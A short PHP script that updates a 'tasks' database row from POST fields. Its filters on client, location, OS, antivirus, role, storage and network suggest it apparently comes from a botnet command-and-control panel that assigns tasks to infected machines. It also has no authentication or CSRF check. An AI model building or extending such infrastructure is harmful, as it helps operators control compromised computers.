<?php
include('db.php');

editTask(formatParams(), $pdo);

function formatParams() {
	$params = array();
    $params['editTaskID'] = $_POST['editTaskID'];
	if ($_POST['editTitle']) { $params['title'] = $_POST['editTitle']; }
	if ($_POST['editType']) { $params['type'] = $_POST['editType']; }
	if ($_POST['editContent']) { $params['content'] = $_POST['editContent']; }
	if ($_POST['editTarget']) { $params['target'] = $_POST['editTarget']; }
	if ($_POST['editTrigger']) { $params['trigger'] = $_POST['editTrigger']; }
	
	if ($_POST['editLimit']) { $params['limit'] = $_POST['editLimit']; } else { $params['limit'] = -1; }
	if ($_POST['editClient_id']) { $params['client_id'] = $_POST['editClient_id']; } else { $params['client_id'] = '-1'; }
	if ($_POST['editLocation']) { $params['location'] = $_POST['editLocation']; } else { $params['location'] = '-1'; }
	if ($_POST['editOs']) { $params['os'] = $_POST['editOs']; } else { $params['os'] = '-1'; }
	if ($_POST['editRole']) { $params['role'] = $_POST['editRole']; }
	if ($_POST['editAntivirus']) { $params['antivirus'] = $_POST['editAntivirus']; } else {$params['antivirus'] = '-1'; }
	
	// Add CPU and RAM
	$params['cpu'] = '-1';
	$params['ram'] = '-1';
	
	if ($_POST['editStorage']) {
		$params['storage_type'] = $_POST['editStorage_type'];
		$params['storage'] = $_POST['editStorage'];
	} else {
		$params['storage_type'] = '-1';
		$params['storage'] = '-1';
	}
	if ($_POST['editNetwork']) {
		$params['network_type'] = $_POST['editNetwork_type'];
		$params['network'] = $_POST['editNetwork'];
	} else {
		$params['network_type'] = '-1';
		$params['network'] = '-1';
	}
	if ($_POST['editStatus']) { $params['status'] = $_POST['editStatus']; }
	
	return $params;
}

function editTask($params, $pdo) {
	$stmt = $pdo->prepare("UPDATE tasks SET `title`=:title, `type`=:type, `content`=:content, `target`=:target, `limit`=:limit, `client_id`=:client_id, `location`=:location, `os`=:os, `antivirus`=:antivirus, `cpu`=:cpu, `ram`=:ram, `role`=:role, `storage_type`=:storage_type, `storage`=:storage, `network_type`=:network_type, `network`=:network, `trigger`=:trigger, `status`=:status WHERE `id`=:editTaskID");
	$stmt->bindParam(':editTaskID', $params['editTaskID']);
    $stmt->bindParam(':title', $params['title']);
	$stmt->bindParam(':type', $params['type']);
	$stmt->bindParam(':content', $params['content']);
	$stmt->bindParam(':target', $params['target']);
	$stmt->bindParam(':limit', $params['limit']);
	$stmt->bindParam(':client_id', $params['client_id']);
	$stmt->bindParam(':target', $params['target']);
	$stmt->bindParam(':location', $params['location']);
	$stmt->bindParam(':os', $params['os']);
	$stmt->bindParam(':antivirus', $params['antivirus']);
	$stmt->bindParam(':cpu', $params['cpu']);
	$stmt->bindParam(':ram', $params['ram']);
	$stmt->bindParam(':role', $params['role']);
	$stmt->bindParam(':storage_type', $params['storage_type']);
	$stmt->bindParam(':storage', $params['storage']);
	$stmt->bindParam(':network_type', $params['network_type']);
	$stmt->bindParam(':network', $params['network']);
	$stmt->bindParam(':trigger', $params['trigger']);
	$stmt->bindParam(':status', $params['status']);
	$stmt->execute();
}
?>